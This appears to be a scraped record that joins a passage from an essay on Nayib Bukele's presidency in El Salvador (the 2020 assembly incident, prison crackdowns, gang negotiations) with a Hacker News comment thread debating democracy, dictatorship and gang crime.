But this stuff isn’t cheap. Through more wrangling, Bukele was able to get the Central American Bank for Economic Integration to agree to a $109 million loan, with a $5.3 million kicker from South Korea. Suddenly, Bukele’s grand plans came to a halt. The Salvadoran legislature, which was still controlled by ARENA, the FMLN, and a bunch of smaller parties, voted against approval for the loan. Like in the United States, the president of El Salvador is the commander-in-chief and can order the military to do almost anything, but the legislature holds the purse strings. If Bukele couldn’t coax the legislative assembly to vote for more financing, the TCP would be dead in the water. Why did the assembly vote against approving the loan? That depends on who you ask. Anti-Bukele forces say that that Bukele was recklessly spending with an already far too indebted country (debt as a % of GDP would increase from 71% in 2019 to 88% in 2020). Others had qualms about the transparency of Bukele’s spending. Others had concerns that this arrogant, charismatic, wildly popular new president had malevolent aspirations, and it probably wasn’t a good idea to give his military and police better weapons. Meanwhile, pro-Bukele forces (including more than one person I spoke to in El Salvador) claimed that the establishment was simply lashing out at a reformer. Bukele had taken the presidency from them, so now they were impeding, filibustering, and financially strangling his regime as a cynical strategy to stop his plans from coming to fruition. For months, Bukele tried in vain to negotiate with the other two parties. But with no headway made, Bukele opted for what was easily the most daring and potentially disastrous maneuver of his career up to that point. On February 6, 2020, Bukele invoked his powers to call an emergency session of the assembly, ostensibly to persuade the legislature to his side. Less than half of the assembly responded to the call, while the rest dismissed it as political grandstanding. The next day, Bukele publicly asked his supporters to protest the assembly with a reference to a constitutional article that protects the popular right of “insurrection.” At some point, Bukele reportedly made contact with El Salvador’s military leaders and received certain assurances, though the extent of these guarantees is unknown. On February 9, a few thousand Bukele supporters gathered around the legislative assembly building in the heart of San Salvador. Bukele arrived outside, told his followers to wait a moment, and then walked inside the assembly with 40 soldiers who sternly stood around the chamber. Bukele took the presiding seat at the front of the assembly, said, “It’s clear who’s in control of the situation and we’re going to put the decision in the hands of God,” and then prayed for a moment. When he was finished, Bukele briefly asked the assembly to vote to approve his loan and left the chamber to give a speech to his supporters while the soldiers stayed behind looking menacing. Bukele announced to his supporters that he was giving the “scoundrels” one week to approve the loan. Over the following weeks, Bukele was accused of running a self-coup by many people within and outside of El Salvador. Protests erupted on university campuses calling for Bukele’s removal. Legislators who had been in the assembly that night said things like “So they’re going to make us vote with a rifle to the head? … This isn’t the way a democracy works,” and “No Salvadoran can be in favor of this; El Salvador is a country where democracy has cost blood.” To which Bukele technically accurately responded, “If I was a dictator, I would have taken control of everything,” and (paraphrasing) “if I wanted to remove the legislators, I would have.” The whole thing was very weird. I think Bukele tried to pull off the putschist form of “because of the implication” (or better yet, the Caesarian version). He didn’t actually threaten to hurt or arrest or even fire anyone. The soldiers didn’t actually point their guns. But it’s hard to ignore the implication of marching loyal soldiers into a democratic chamber, praying to god, demanding they change a law, and then issuing an ultimatum. To give Bukele his due, I think there is credence to the notion that El Salvador was in dire straits, and Bukele’s TCP was extremely popular, and the legislative resistance to it was based more on cynical politicking than fair-minded disagreement. Or perhaps the best argument in Bukele’s favor is that his self-coup maneuver ultimately didn’t work. The legislature called Bukele’s buff and refused to approve the TCP loan. Bukele continued to huff and puff and make a big show of everything, but ultimately, he lost the political standoff. In retrospect, the significance of February 9 was not the TCP loan, or even the resiliency of the establishment. Rather, it was Bukele’s sizeable breach of democratic norms and the positive response from the general Salvadoran population. Sure, Bukele was hounded by the international press, and denounced by politicians as a wannabe dictator, and protested by leftist students, but most Salvadorans continued to love him. Actually, many Salvadorans loved him more than ever. They saw February 9 as an indicator that Bukele was serious about reform. He was willing to do whatever it took to break the establishment and get the Salvadoran people what they needed. Perhaps there are circumstances where effective governance is more important than democratic procedure, especially when such procedures are exploited by bad faith actors. It’s possible that the backlash from February 9 could have hurt Bukele more, but then COVID-19 suddenly arrived in El Salvador. Political fights over the TCP were quickly put on hold. On March 21, Bukele declared a “state of exception,” a temporary enhancement of executive powers to respond to emergencies. His regime then laid down harsh COVID restrictions, even for the region, including mandates to detain individuals for quarantine violations. Within a few months, over ten thousand individuals would be sent to “containment centers” that the New Yorker describes as “de-facto jails.” I take any evaluations of COVID policies using available statics with a massive grain of salt due to the million uncontrolled factors, bad incentives of recording statistics, and sheer randomness of COVID’s impact. But for what it’s worth, the stats suggest that El Salvador did better against COVID than the rest of Central America, besides Nicaragua with its extremely suspiciously amazing figures: Country Cases per 1 million pops Deaths per 1 million pops El Salvador 30,816 646 Guatemala 69,285 1,091 Honduras 46,432 1,092 Costa Rica 239,058 1,819 Panama 238,307 1,962 Nicaragua 2,728 33 Whether due to the TCP or COVID-19, the murder rate was trending down faster than ever in early 2020. But then from April 24-27, there were 77 murders across the country, many of which occurred in prisons. Bukele responded by declaring a “maximum emergency in every detention facility holding gang members,” including locking gang members in their cells for 24 hours and placing gang leaders in solitary confinement indefinitely. Prisons were also ordered to avoid putting gang members of the same gangs in cells together, which, along with many other restrictions, were intended to reduce communication and coordination within gang structures. As expected, Bukele’s critics denounced all this as unconstitutional and inhumane, particularly given how COVID would tear through the close quarters of prisons. Pictures like this began showing up in the international media: https://www.hrw.org/news/2020/04/29/el-salvador-inhumane-prison-lockdown-treatment The COVID restrictions and prison crackdown followed the same trend as the February 9 quasi-coup. Bukele was constantly attacked by Salvadoran politicians, Salvadoran leftists, and the international media for alleged constitutional violations. For instance, Bukele undoubtedly had the authority to launch the prison crackdown, but despite an on-paper legal limit of 15 days, he extended the crackdown indefinitely. Or better yet, during the crackdowns, Bukele “authorized” lethal self-defense against gang members, and even said “the government will see to the legal defense of those who may be unjustly charged, for defending the lives of honorable people,” both of which probably constitute blatant excesses by the executive branch over the legislative branch’s lawmaking powers. And yet, Bukele’s popularity only grew. His critics accused him of not having real plans, of making all his policies up as he went along; many of his decrees were suddenly announced on Twitter or over late night orders to the police and military, without even the attempt to verify their legality. Bukele’s critics responded: so what? Why should Bukele wait for permission from legislators and judges who hate him? By violating these norms and defying the establishment, Bukele only further proved that he possessed the dynamism and determination to fix El Salvador. In September 2020, Bukele faced his greatest public relations challenge yet, worse even than the February 9 self-coup. El Faro, the Salvadoran media outlet that had uncovered Bukele’s negotiations with B-18 when he was mayor, discovered that Bukele was still negotiating with the gangs as president, this time with both B-18 and MS-13. Prison records seemingly confirmed that Bukele emissaries (including the head of the TCP’s Stage Two) had been talking to the gang leaders since shortly after his election all the way back in mid-2019. According to El Faro, Bukele promised the gang leaders better conditions in the prisons and social/monetary assistance through Stage Two of the TCP in exchange for keeping the murder rate down and support for Nuevas Ideas in the next election. If this was true, it would not only be extremely illegal, but also cast the roughly 60%ish decline in the murder rate since Bukele took office in an entirely new light. Bukele denied everything. He accused El Faro of being a partisan rag spreading fake news, and a week later, the government opened a money laundering investigation into the outlet. Slightly more credibly, Bukele and his supporters argued that the notion of Bukele agreeing to give the gangs better conditions was absurd in light of the TCP and the prison lockdowns. Hadn’t they seen the pictures? https://www.vox.com/world-politics/2023/3/5/23621004/el-salvador-prison-bukele-ms13-barrio-18 El Faro’s report was almost certainly accurate, or at least the American government seems to believe so. Over a year later, the US Department of the Treasury slapped economic sanctions on some high level Bukele lieutenants for technically financing gang activity. I consider this revelation to be another fascinating data point in evaluating Bukele. You can take it as evidence that Bukele is either maximally cynical or pragmatic. You can take it as evidence that Bukele just does whatever random shit pops into his head even when it’s at cross purposes, or that he has the capacity to carefully navigate complex policy schemes and still come out ahead. What can’t be denied is that the negotiation revelations indicate Bukele’s tremendous skill as a politician. The gang negotiations annihilated the credibility of the FMLN six years earlier, but Bukele was too wily to be caught in the same trap. Through clever rhetoric, denials, condemnations, and charisma, he rode out the PR storm. The proof of Bukele’s popularity arrived in February 2021 with the legislative assembly elections. Bukele’s Nuevas Ideas (officially headed by his cousin) took over 2/3rds of the seats, while ARENA and the FMLN were reduced to 20% combined. After yet another landslide victory for Bukele, he had nearly complete control of two branches of government. And the third branch wouldn’t escape his grasp for long. Throughout the implementation of the TCP, the COVID restrictions, and the prison lockdowns, the Salvadoran Supreme Court had been another thorn in Bukele’s side with periodic declarations that his executive decrees were unconstitutional. Bukele’s response was typically just to ignore the court and keep doing what he was already doing. But it clearly hurt his reputation, especially internationally as more and more think pieces were being written by Western media outlets about El Salvador’s new aspiring dictator. On May 1, the first day of the new legislature, Bukele dropped the hammer. In the United Sta",
    "commentLink": "https://news.ycombinator.com/item?id=39879432",
    "commentBody": "Notes on El Salvador (mattlakeman.org)213 points by yorwba 10 hours agohidepastfavorite149 comments OscarTheGrinch 4 hours agoMy friend from Central America got upset when nearly everyone at a London party took turns to do coke in the bathroom. He told me a pretty harrowing story of how his family had had their lives ruined by drug gangs. A colleague of mine was on a flight when balloon of drugs burst inside a drug mule. They died. Our appetites fuel a cycle of violence and depravity. reply keiferski 3 hours agoparentThere is a dead comment pointing this out, but El Salvador gangs are not primarily drug gangs. The article goes into it further, but the short version is: the gangs there are/were focused more on extortion, with a consequence being that they are dramatically less wealthy than drug organizations in Colombia and Mexico. reply pcthrowaway 3 hours agorootparentI don't think the reason they were less wealthy was because they were primarily in extortion and not drugs, it was because they hadn't created a funnel for money from wealthier countries to enter their pockets. I believe some Russian and North Korean gangs have figured out how to do this via extortion (cyber-crime), but the drug trade seems to be another popular way to do it. reply keiferski 3 hours agorootparentI meant more in relation to other Latin American gangs, which are wealthy because of drugs. The El Salvador gangs are extorting low income people in El Salvador, so cyber crime is not really a lucrative thing. reply cageface 2 hours agoparentprevMy experience traveling in Colombia was that they are generally quite down on it because of the harm they see the illegal drug trade has done to their country. It's the worst kind of resource curse. reply oefnak 2 hours agoparentprevYou could also say the fact that it is illegal causes the problems, not people using it. reply droopyEyelids 2 hours agoparentprevI thought that type of thinking was specifically an American thing, where we are told individuals must take responsibility for and solve the problems created by huge government/business decisions. Almost every human has an appetite for some sort of mind alteration, but all the harms you describe here are from fucked up legal situations that have been imposed on us to control the profit and political power that trade would shift. reply WheelsAtLarge 7 hours agoprevThis has been the best one place summary of the Salvadorian situation I've read so far. I've had some understanding of the situation through Salvadorian friends and a few news articles that tried to give a quick synopsis. But I can say that what I read in this post concurs with what I know and expands greatly on it. I suspect that there's got to be a few errors. It's inevitable simply because it's a one-person summary. But kudos to Matt Lakeman, he did a very good job. reply whatever1 3 hours agoprevQuoting from the article: \"The whole point of democracy is to spread political decision-making and create approval-based feedback loops with the population so that good leaders are elected and bad leaders are deposed without resorting to violence. Dictatorships concentrate power to permit more state dynamism but at the expense of this dispersed risk. This makes dictatorships a higher risk-higher reward proposition. A good dictator can do more good without democratic constraints, but a bad dictator can do more bad.\" reply StrauXX 2 hours agoparentNo they don't. The issue with dictatorships is that your powerbase rurns from \"the people\" (or a wealthy subset of the people, depending on how well your democracy works), to a small group of powerfull supporters. Army generals, police chiefs and so on. Even if you were an angel, the power dynamics of dictatorships don't give you the ability of doing all too much for the general populace. Thats the beuaty of democracy. Your power base is (indirectly and delayed, but still) the people. This aligns incentives and power dynamics between power holders and regular inhabitants much more than in any kind of autocracy. reply donny2018 1 hour agorootparentA proper dictator will immediately remove all potential power from army generals, police chiefs, political party leaders and so on. He will not even remotely allow any potential challengers that are capable of consolidating enough resources to even think of causing any trouble. On the other hand, he will allow his establishment to feed off the system, so they become dependent on him and remain interested in maintaining status quo and stay within the line. Of course, this is reinforced with brutal crackdowns on any form of dissent. He makes everyone worthless and replaceable, and makes it seem that it is very easy to lose everything if you show any disloyalty or try to push for your interests in a wrong way. In the country where I'm from, military chief commanders were just some planted nobodies that were rotated every year or so. All political establishment was fully loyal and were too weak to even have fantasies on grabbing power. reply whatever1 1 hour agorootparentprevWhich works in long time scales as long as the players agree that they will play by the rules of democracy, aka respect the institutions. So democracy suffers from 2 main issues: 1) timeliness: some problems need to be solved now, not in 10 years. Example, need to decide your stance against Russia. 2) fragility from the inside: A malicious player can manipulate democratic institutions and convert it to an autocracy. See Russia, Turkey and Jan 6 USA. Not sure how one can design a system robust to these two threats. reply kevinak 24 minutes agoprevRelevant to the BTC story is this recent tweet by Bukele: https://twitter.com/nayibbukele/status/1768425845163503738 Looks like they have quite a stack compared to what people previously thought. There's also a tracker you can follow: https://nayibtracker.com reply fvdessen 8 hours agoprevGang crime seem to be a common weakness of democracies. There's a notable list of countries that had to resort to elect a quasi-dictator to get rid of gangs. As my hometown is coming to grip with a bubbling gang war, I wonder if there is a better way. reply wolverine876 4 hours agoparent> Gang crime seem to be a common weakness of democracies. I've read many histories and that hasn't been a problem. I've lived all my life in democracies and it's never been a problem anywhere that I've lived. I also don't see a correlation. Countries with high levels of corruption, of every form of government, have organized crime problems. Haiti has a very serious gang problem but never much democracy. You might not read about gangs as much in dictatorships because, first, the government is a gang - they are a gang that took over government. And also there's no free press. And on the other side of the correlation, modern democracies are the safest, most prosperous places in the history of humanity. And they have a free press to report on everything. Nothing is perfect, of course; but compare them to the alternative (and to history), not to the almighty. Also, the premise that democracy is optional is irrational. If the people don't get to select their leaders, who the f- does? Who will do better? If they are so clearly better, why not have a vote? reply blackhawkC17 4 hours agorootparentDemocracy has largely worked and ushered in widespread economic and social development in the West. The issue is that many cultures are quite incompatible with democracy, unlike the West. Many countries are still stuck in a culture of tribalism and corruption and keep voting horrible leaders (the vast majority of Africa and a few in Asia and Eastern Europe). But I agree with you that people should have a say in who leads them. If they keep voting horrid leaders, that’s a problem they brought on themselves. reply wolverine876 4 hours agorootparent> many cultures are quite incompatible with democracy, unlike the West That's an old excuse of dictators, one of a series of obviously self-serving justifications for their taking power and oppressing others. Consider the cultures worldwide where democracy has thrived: The 'West' (Western Europe/US/Canada), Eastern Europe, South Asia, East Asia (S Korea, Japan, Taiwan - the wealthiest part of China by far, per capita, despite China's constant attacks on them), Costa Rica, South America (Brazil, Chile, others), places in W. Africa (Benin, Senegal), E Africa (Kenya), etc etc. In fact, democracy's record is entirely the opposite. It's by far the greatest development in human history; and somehow, instead of pulling their weight, doing their part as our ancestors did, who sacrificed so much, so many are dallying with power-hungry dictators. reply blackhawkC17 4 hours agorootparentI agreed with you in my statement. Democracy works excellently when done well. The problem is that figuring out how to make democracy work is one of the hardest tasks on earth (I’m living in a country suffering from terrible corruption and tribalism under democracy). Yet, I still said that I prefer a system where people choose their leaders…it’s on them to make it work. reply wolverine876 3 hours agorootparent> figuring out how to make democracy work is one of the hardest tasks on earth Lots and lots of places have done it. But yes, it can be difficult - it's up to the people, like everything else. If they want it, they will have it. reply philwelch 2 hours agorootparentprevI think you're getting the causation backwards here. Successful countries can maintain democracies, but when a democracy runs into a crisis it can't handle, it usually ceases to be a democracy. You're just not counting the failures because most failed democracies turn into some other form of government. reply blackhawkC17 2 hours agorootparentHmm, good perspective. But doesn’t this seem to be a no true Scotsman fallacy? If you call all failed democracies not real democracies, you can write them off and only focus on the successful ones. Does a corrupt and poor democracy ceases to be a democracy? I agree that democracy is the best system when implemented well. I’m just pointing out that many countries have struggled to succeed as democracies because they lack the proper mindset and culture of maintaining one. reply philwelch 1 hour agorootparentI think we’re mostly in agreement here? I did say most failed democracies turn into other forms of government, which I think is broadly true. Consider Weimar Germany, Russia, and Zimbabwe as examples of this tendency. And while this is somewhat unfalsifiable, you could argue that any failed democracy that is still democratic is bound to eventually turn into another form of government eventually, or just to collapse into a completely failed state and de facto anarchy or civil war, like Haiti or Lebanon. I definitely agree that many countries aren’t really capable of being successful democracies. Lee Kwan Yew famously thought this was true of Singapore, and judging from what he did with the place I wouldn’t argue with him. You should also consider failed attempts to establish democracies, such as Afghanistan. reply cjbgkagh 4 hours agoparentprevI think people forget that universal suffrage and male suffrage are pretty recent phenomenon, so when talking about democracies we should understand that historical democracies were very different. As such this weakness may be more of a character of modern universal suffrage democracies. There might be a middle point between everybody voting and one person voting that would be more optimal. reply Empact 2 hours agorootparentIndeed, in the US we too have a history of creating “states of exception” to the same effect, e.g.: https://en.wikipedia.org/wiki/San_Francisco_Committee_of_Vig... reply ffgjgf1 2 hours agorootparentprev> There might be a middle point between everybody voting and one person voting that would be more optimal. That’s called an dictatorship. Absolute unquestionable authority is a myth, even Stalin relied on the support of others to stay in power and had to make decisions while keeping that in mind. Most other dictators in history didn’t even remotely have as much power as him. reply wolverine876 4 hours agorootparentprevHistorical humanity was nothing like what you have now, a product of generations of modern democracy which has yielded the most free, most wealthy, most prosperous places and times in the history of humanity. For ~95% of human (homo sapien) history, we were hunter-gatherers. Everything else is a recent phenomenon. Even starting with settled, post-hunter-gatherers, democracy wasn't common at all until the last couple centries. We left that past behind for a reason, and live far, far better now. > There might be a middle point between everybody voting and one person voting that would be more optimal. Who gets to decide that? No doubt you would be willing to let others rule over you, taking away your freedom and power? Whoever doesn't have a seat at the table is certain to be victimized by those in power. reply cjbgkagh 4 hours agorootparentI have never voted, and can’t vote in the country I live in. And I’m perfectly happy with it. You could say I voted with my feet and my wallet. There are plenty of ways to wield power without voting. I know it’s a touchy point for people, the justifications being if you’re taxed then you must be able to vote. I know plenty of people who would give up their vote to live tax free. Then there is also the draft, if you can be drafted you must be able to vote. I would rather abolish the draft. We live in an era with many firsts so historical comparisons are not generally particularly useful. And I think it’s too early to tell if all modern decisions are good ones. The point I’m making is people are thinking the two options are dictatorship or universal suffrage democracy and I’m saying not only does a middle ground exist but that middle ground used to be the default. reply wolverine876 3 hours agorootparent> I know it’s a touchy point for people You don't need to try the BS characterizations of people who disagree with you. Just make your argument. You may know people who make those choices, but those are their choices, their democratic, free choices, and they can change their minds tomorrow if they don't like how it's working out. That's the point - they choose, nobody else gets to choose for them. > The point I’m making is people are thinking the two options are dictatorship or universal suffrage democracy and I’m saying not only does a middle ground exist but that middle ground used to be the default. And the same questions apply - see the GP. reply pottertheotter 7 hours agoparentprevWhat country, if you don’t mind saying? reply fvdessen 7 hours agorootparentBelgium, the Antwerp port is the main entry point for drugs in Europe, and there is high demand for drugs in Belgium itself as well. The gangs used to be 'quiet' but there's been a drive-by shooting wave in Brussels recently, which re-opened the debate about what to do with all this. I know the situation is in no way comparable with what's going on in South-America, but there are also well known spots in the city where drugs are dealt openly, people even queue, which is a bit of a wtf Of course the extreme right is riding on this hard and winning a lot of popularity as a result reply mynameishere 7 hours agorootparentprevhttps://en.wikipedia.org/wiki/Sicilian_Mafia_during_the_Fasc... All governments are basically mafioso. Consider the existence of national security laws of every government. These are a kind of legal Omertà. reply yichi 7 hours agoparentprevDictatorship is very good at combating crime if it's under good hands (which itself is a tall order imo), just look at Singapore, the problem with dictatorship is the lack of accountability and 99% of dictators simply suck at governing hence democracy is usually better since most dictators have a severe case of Dunning–Kruger effect. People like Bukele and Lee Kuan Yew are very few and far between. reply wolverine876 4 hours agorootparentDo you have evidence of the first sentence? Or is it circular?: If crime goes down, they are 'good' dictators. What about the victims of those dictators, who lose lives and families and freedom? They don't much benefit from the 'good'. reply jjav 4 hours agorootparent> If crime goes down, they are 'good' dictators. Crime nearly always goes down with dictators, that's not a good metric. The question is how many completely innocent people have their lives ruined or lost in the process. reply wolverine876 3 hours agorootparent> Crime nearly always goes down with dictators Wow, I am pretty well informed and I've never seen that. Do you have evidence of it? reply muststopmyths 7 hours agoprevGreat article, but I do have one quibble. The author says El Salvador was not an interesting country to visit to him. Based on my personal experience the countryside is beautiful, the beaches are great and the people are lovely. Yes, the cities are \"ugly\" but I didn't mind San Salvador at all. I'm not the type to seek out nightlife though. It would be a shame to miss it if you're in the area. reply blovescoffee 4 hours agoparentHonest question, what do you mean be “if you’re in the area?” Like near San Salvador or in Latam? Or what area reply muststopmyths 3 hours agorootparentTraveling in Central America. For example, a lot of people go to Guatemala or to Honduran beaches but skip El Salvador out of apprehension reply kovezd 8 hours agoprevThe article does present a very objective evaluation of Bukele as a person, and statesman. One has to deeply wonder about Political Theory after reading stories like this. reply nemo44x 7 hours agoparentWhich political theory? I think Machiavelli was more or less right. Many old texts are quite wise. I’d agree most political theories from the 20th century on is pretty much bunk unless cynical, oligarchical subterfuge is your goal. But if you dig deep enough and long enough into the past there is a lot of wisdom. Bukele in many ways expresses many of these. reply keiferski 3 hours agoprevAnyone that is interested in the “too centralized power vs. safety” topic should really read Leviathan. https://en.wikipedia.org/wiki/Leviathan_(Hobbes_book) I read the whole article and admittedly most of my knowledge of El Salvador comes from it, but I do think that the critics seem to not understand the concept of monopoly of violence, and how much of the democratic norms that keep the developed world in check are built upon this centralized authority. Great article and I do agree with his basic conclusion: so far, it’s “been worth it”, but the cost may be future instability. I think a lot of people want El Salvador to turn into a typical western democratic state, but IMO I think their goal is to be something more like Singapore. reply estebarb 6 hours agoprevThe possible intervention of Bukele in other countires affairs is concerning. For example, trying to create new political parties https://www.larepublica.net/noticia/un-bukele-en-costa-rica-... . Then you see that at the same time, El Salvador offers 0% tax to tech companies, Costa Rica defunds all computer science education in elementary/high school level and also defund an agency for bringing external investors... At some point you stop thinking that is was just a coincidence. reply bradrn 8 hours agoprev> As with everywhere else in the developing world, there are also a bunch of cheap Chinese imports […] Note: the images below this text actually show Korean writing, not Chinese. reply billllll 7 hours agoprevIt's crazy how popular authoritarian demagogues have gotten around the world. His campaign, mannerism, and treatment of media and opposition can be a cut and paste of a bunch of different politicians of the world. At the end of the day though, I really hope it all works out. reply starspangled 5 hours agoparentWhat's crazy is just how terrible the globalist neoliberal political agenda and the mindless cookie cutter politicians they produce everywhere have been, that people are thoroughly fed up and are looking for alternatives, no matter how bad. reply bugglebeetle 4 hours agorootparent> globalist neoliberal political agenda Bukele pitches crypto at CPAC, so it’s frankly hilarious you think he resides outside this order. reply starspangled 1 hour agorootparenthttps://www.youtube.com/watch?v=oxo92I-akL0 This speech? You think that makes Bukele a \"globalist neoliberal\"? That would indeed be hilarious, if you did. I do like your sense of humor! But no I wasn't claiming any particular person is or is not \"with\" the western ruling class. Obviously this order welcomes many horrible dictators (and \"authoritarian demagogues\") among its ranks, famously in the Middle East but really anywhere it furthers their power. I was just commenting on the parent's post about people supporting them, and it's in contrast to their cookie cutter ones. The Justin Trudeau, United Nations types. Not saying any particular politician or policy is better or worse, just that people feel like they've been failed. reply navigate8310 3 hours agoprevWhat a brilliant piece of writing! As someone who was previously uninformed about the Guatemala belt of countries, this article provided a thorough understanding of the issues. Although it took me an hour to read, every second was enthralling. Thank you, Matt, for such an enlightening piece! reply stainablesteel 8 hours agoprev> Rather, the best case against Bukele is that he has created severe systemic political risk in El Salvador by converting the government from a democracy to a de facto dictatorship then hes in a good place to introduce some kind of monarchy, or personal transfer of power, someday. people want him to be dictator for life and he seems to be loved enough to receive it. democracy doesn't deal with gangs well enough to make a country like this functional. hes a wise person whose made good investments for his country. reply screye 8 hours agoparentAs a cynical idealist, I once tried to find 1 country of decent size that could escape the poverty/mis-governance trap while being a democracy. I found zero success stories. Every 20th century economic success story was a defacto autocratic nation. They only transitioned to democracy after they'd reached a certain level of development. (I excluded preexisting high HDI nations and ones that accidentally hit mineral gold) It's similar to how commitees have never built successful startups. At the early phases, you need a decisive and singular leader. I continue to be on team democracy for poor nations. But I'm well aware that data is not on my side. reply Gimpei 6 hours agorootparentThis is not true. Japan and South Korea both experienced the majority of their growth as democracies. Eastern Europe only took off after the fall of the USSR. Chile experienced most of its growth after Pinochet. India is the largest Democracy on earth and it is growing at a very fast clip. That being said, there simply aren’t very many countries and even less ones that made the successful leap to rich world status regardless of the political regime. There’s a huge small sample problem here. And then of course there’s also a huge endogeneity problem. The literature in general has found a weak positive association between democratization and growth. And that’s about the most we can say. Stop worrying about the data not being on your side; it isn’t on anyone’s side. reply greenavocado 6 hours agorootparentThat's not quite accurate. The dominance of the Liberal Democratic Party (LDP) for most of the post-war period has led to critiques regarding the vibrancy of political competition and the effective functioning of democracy. The chaebols, those massive family-run conglomerates, have essentially been the architects behind South Korea's economic renaissance since the '60s. Think Samsung, Hyundai, LG - these giants spearheaded the transformation from a post-war economy to an industrial powerhouse, under the guidance of policies favoring heavy industrialization and export-led growth. It's fascinating to see how the government played matchmaker here, doling out financial support and monopolistic privileges like candy at a parade. This strategic play birthed the \"Miracle on the Han River,\" flipping the script from poverty to prosperity. But, as with all tales of meteoric rise, there's a darker subplot. The symbiosis between the chaebols and political elites isn't all roses. Issues of corruption, nepotism, and economic dominance cloud this success story, leading to a wave of calls for corporate governance reform and efforts to dilute their power. On a different note, South Korea's journey to democracy is a saga of its own. Decades of authoritarian rule gave way in the late '80s, thanks to the collective might of students, intellectuals, and labor activists. The June Democratic Uprising in '87 was a game-changer, forcing the military regime's hand to pave the way for democratic reforms and the country's first free presidential election later that year. reply thisislife2 5 hours agorootparentQuite true - and even with democracies like Japan and India, it is quite apparent from their early history that they were kind of autocratic democracies with one large party / leader / family in power for a long period. In India, the Indian National Congress ruled for nearly 5+ decades since independence, and 3 of its Prime Ministers were dynasts (Nehru, Indira Gandhi, Rajiv Gandhi) from the same family. Note also that in Japan and South Korea, the US had a vested interest in not allowing democracy to thrive. reply screye 4 hours agorootparentI'm Indian, I would seriously question anyone who considers India to be an 'economically successful' democracy. 400 million Indians still make less than many sub-saharan African nations. India is admittedly stable. But it was very much an economic failure. Things only started turning around in the mid-90s. reply wolverine876 4 hours agorootparentLet's not forget that before the 1990s, there were the partitions with Pakistan and Pakistan-Bangladesh, Indira Gandhi's seizure of power ... > 400 million Indians still make less than many sub-saharan African nations. Yes, and they are more important than all the programmers in Bangalore. Also, non-Hindu Indians, including those who are Muslim, are relegated to second-class status (which also must affect their economic opportunity). reply suslik 1 hour agorootparent> they are more important than all the programmers in Bangalore. What do you mean by this? reply wolverine876 4 hours agorootparentprevIndia's economic boom came under the democractic governments post-1990. Modi is, arguably, riding that wave. reply Swizec 6 hours agorootparentprev> Eastern Europe only took off after the fall of the USSR The Balkans maybe don't count as Eastern Europe, but before ww2 we were predominantly agrarian. 75% of the population worked on farms[1]. By the 1970's Yugoslavia was a modern industrial economy with all the accoutrements you would expect from a European nation (power, sanitation, roads, etc). Only 29% of the population worked on farms[2]. Then in early 1990's the country fell apart, democracies came out of the ashes, and by 2004 the first bits of former Yugoslavia started joining the EU and NATO[3]. Overall a great success. [1] https://en.wikipedia.org/wiki/Kingdom_of_Yugoslavia#Farming [2] https://en.wikipedia.org/wiki/Economy_of_the_Socialist_Feder... [3] https://www.gov.si/en/topics/slovenia-as-an-eu-member-state/ reply hayst4ck 5 hours agorootparentprevCGP grey did a great video on The Dictators Handbook: https://www.cgpgrey.com/blog/rules-for-rulers It is well worth a watch. Anyone with an interest in democracy (or corporate politics or dominance hierarchies) definitely should watch it. I feel that his discussion of the making of the video was even more interesting (although long winded): https://www.youtube.com/watch?v=ILvD7zVN2jo The interesting conclusion that he draws in the discussion of the video is that all systems of governance are dependent upon responsible people getting into positions of power and then choosing to act responsibly rather than selfishly. The key insight is that getting into the position of power is corruptive and you have to make personal sacrifices to not be corrupted. reply nextos 7 hours agorootparentprevIceland and Ireland went from being poor to wealthy and stable, both as small democracies, and during the 20th century. reply bombcar 5 hours agorootparentIceland is also the oldest democracy in the world, so it's less they went from \"incredibly crappy existence\" and more \"they were always stable, and just became more wealthy\". I'm taking the OP as talking more about \"you can't democracy your way out of being Haiti\" kind of things. reply bitcurious 7 hours agorootparentprevThe US became absurdly wealthy during the 20th century. Canada did well too. Poland, Czechia, Estonia and a few other recently independent democracies are thriving as well. reply coldtea 6 hours agorootparent>The US became absurdly wealthy during the 20th century. Yes, but it was bootstrapped by the biggest land takeover in history, along with all of its natural resources. It also benefitted from all the western big players of the 19th/early 20th century being exhausted after 2 wars that never touched continental US soil. Neither is easily replicated without a rich in natural resources continent full of easy targets, or massive remote wars. reply thisislife2 5 hours agorootparentprevCan you really disregard its imperialistic history here - the foundation of the American economy was built on slave labour and colonisation (even if it was a late player), and you wish to completely ignore the role of the early western settlers in America. reply wolverine876 4 hours agorootparent> the foundation of the American economy was built on slave labour and colonisation (even if it was a late player) I thought the slave states were significantly poorer than the free states, a major advantage of the North in the Civil War? I'm sure it's been examined, but would the South have been better off with paid labor of free people? Countries using that model do far better. Imagine someone trying to compete with slave labor against a modern enterprise. For colonization, that seems to have played a minor role in the US economy? My understanding of the pre-industrial or non-industrial US economy is that it's most powerful engine was the Mississippi River basin, which is something like the largest continguous amount of farmland in the world with navigable waterway access to the sea (and thus a way to get goods to market, as overland transport was much too expensive - compare a barge to a horse, or even a train). reply crq-yml 2 hours agorootparentThe US represents a certain mythology around the Enlightenment principles that were most popular at its founding: one of the big ones was Bentham/Smith utilitarian market thinking, resulting in a conflation between \"pursuit of happiness\" and \"pursuit of property\" that the founders were not exactly encouraging of, but which many contemporary authors, inspired by John Locke's writings on property, were considering. I believe that's at the heart of the Civil War discussion, because downstream of that mythology, alongside the \"life and liberty\" parts, are the compromises of slave vs free states. What took place from the founding into the 19th century was the experiment in following the myth and seeing where it led, which favored industrialization. The South had the wealth when the nation was agrarian, but the founding principles gave a political edge to industrialists, enabling the development of roads, canals, and eventually rails, while also using cheaper immigrant labor to build those things; using slaves to do these projects creates a less favorable balance sheet for the owner, because bodies that you own and are mandated to take responsibility for cannot simply be fired and replaced with new ones if they are too weak to work. This tension of old vs new wealth also propelled western expansion, since it led to the \"1 free state per slave state\" dynamic to maintain political consensus, only for it to hit an abrupt ending in the 1850's when expansion reached the West Coast. reply keiferski 3 hours agorootparentprevYes, one way (and the best way, IMO) to look at the Civil War is that the industrialized part of a country overcame the non-industrialized part. Most of the industrial successes in oil, trains, steel, etc. had their roots in or were dramatically accelerated by the war. reply ImJamal 3 hours agorootparentprevThe North also had twice the soldiers which probably doesn't hurt. reply philwelch 7 hours agorootparentprevThe US became absurdly wealthy during the 19th century as well, particularly after the Civil War. reply kovezd 7 hours agorootparentprevInteresting, you should publish your results. And it does makes sense, in a way it would be similar to letting children (developing persons) make their own decisions. The interesting question would be what is then, the best form of government for developing nations. Or even better, what are the required skill-set for leaders to bring development? reply greenavocado 6 hours agorootparentprev> It's similar to how commitees have never built successful startups. At the early phases, you need a decisive and singular leader. And then in the late phases you stagnate and get overthrown. Am I right? reply wolverine876 4 hours agorootparentprevThere are endless success 